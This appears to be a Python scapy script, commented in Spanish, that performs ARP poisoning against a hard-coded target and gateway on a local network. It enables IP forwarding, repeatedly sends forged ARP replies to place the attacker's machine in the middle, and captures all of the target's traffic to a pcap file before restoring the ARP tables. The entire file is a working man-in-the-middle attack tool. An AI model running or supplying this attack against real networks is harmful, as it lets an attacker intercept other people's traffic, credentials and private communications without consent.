from scapy.all import *
import os
import signal
import sys
import threading
import time

#Parametros del programa
gateway_ip = "192.168.252.1"
#target_ip = "192.168.253.149"
target_ip = "192.168.252.93"
packet_count = 0
interface = "wlp2s0"

#Configuracion inicial
conf.iface = interface
conf.verb = 0

#Descripcion: Dada una direccion IP, obtiene la direccion MAC. Lo que hace es hacer un ARP Broadcast
#y recibe una respuesta ARP con la dirección MAC.
#Entrada:   Direccion IP
#Salida:    Direccion MAC
def get_mac(ip_address):
    #Armo una request de tipo ARP. Esta request se la paso a la funcion sr, que lo que hace es enviar y recibir paquetes
    #de capa 3
    ret = None
    resp, unans = sr(ARP(op=1, hwdst="ff:ff:ff:ff:ff:ff", pdst=ip_address), retry=2, timeout=10)
    
    for s,r in resp:
        print("entre")
        if(ret == None):
            ret =  r[ARP].hwsrc
    return ret


#Restaura la red revirtiendo el envenenamiento de ARP. Lo que hace es Hacer un broadcast ARP con la 
#direccion MAC e IP correctas.
#Entradas:  Direccion IP del gateway, Direccion MAC del gateway, Direccion IP del objetivo, Direccion MAC del objetivo
#Salida:    void 
def restore_network(gateway_ip, gateway_mac, target_ip, target_mac):
    send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=gateway_ip, hwsrc=target_mac, psrc=target_ip), count=5)
    send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=target_ip, hwsrc=gateway_mac, psrc=gateway_ip), count=5)
    print("[*] Deshabilitando IP forwarding")
    #Deshabilito el redireccionamiento de red de la pc mia.
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
    #mato el proceso del script
    os.kill(os.getpid(), signal.SIGTERM)

#Sigo enviando respuestas de ARP falsas para poner mi pc en el medio.
#Entrada:   Direccion IP del gateway, Direccion MAC del gateway, Direccion IP del objetivo, Direccion MAC del objetivo
#Salida:    void
def arp_poison(gateway_ip, gateway_mac, target_ip, target_mac):
    print("[*] Empezado el ataque ARP poisoning [CTRL-C para parar]")
    try:
        while True:
            send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip))
            send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip))
            time.sleep(2)
    except KeyboardInterrupt:
        print("[*] Se detuvo el ataque ARP poison. Restaurando la red...")
        restore_network(gateway_ip, gateway_mac, target_ip, target_mac)

#Inicio el script
print("[*] Comenzando Script: arp_poison.py")
print("[*] Habilitando IP Forwarding")
#Habilito el redireccionamiento de red en mi pc
os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
print(f"[*] Gateway IP: {gateway_ip}")
print(f"[*] Target IP : {target_ip}")

#Obtengo la direccion MAC del gateway
gateway_mac = get_mac(gateway_ip)
if gateway_mac is None:
    print("[!] No es posible obtener la dirección MAC de la gateway. Saliendo..")
    sys.exit(0)
else:
    print(f"[*] Direccion MAC de la gateway: {gateway_mac}")

#Obtengo la direccion MAC de la maquina objetivo
target_mac = get_mac(target_ip)
if target_mac is None:
    print("[!] No es posible obtener la dirección MAC del objetivo. Saliendo..")
    sys.exit(0)
else:
    print(f"[*] Direccion MAC del objetivo: {target_mac}")

#Inicio el hilo que hace el envenenamiento ARP
poison_thread = threading.Thread(target=arp_poison, args=(gateway_ip, gateway_mac, target_ip, target_mac))
poison_thread.start()

#Leo el trafico y lo escribo en el archivo pcap
try:
    #Seteo un filtro que sea donde obtengo los paquetes que tienen como ip host la maquina objetivo
    sniff_filter = "ip host " + target_ip
    
    print(f"[*] Comenzando captura de paquetes. Cantidad de paquetes: {packet_count}. Filter: {sniff_filter}")
    packets = sniff(filter=sniff_filter, iface=conf.iface, count=packet_count)  # Aca queda loopeando

    #Escribo los paquetes (la cantidad que haya seteado en los parametros de configuracion) 
    #que intercepto a un archivo pcap
    wrpcap(target_ip + "_capture.pcap", packets)
    
    print(f"[*] Deteniendo la captura de paquetes.. Restaurando red..")
    restore_network(gateway_ip, gateway_mac, target_ip, target_mac)
except KeyboardInterrupt:
    print(f"[*] Se detuvo la captura de red.. Restaurando red..")
    #Una vez que presiono ctrl + c restauro la red a su estado inicial
    restore_network(gateway_ip, gateway_mac, target_ip, target_mac)
    sys.exit(0)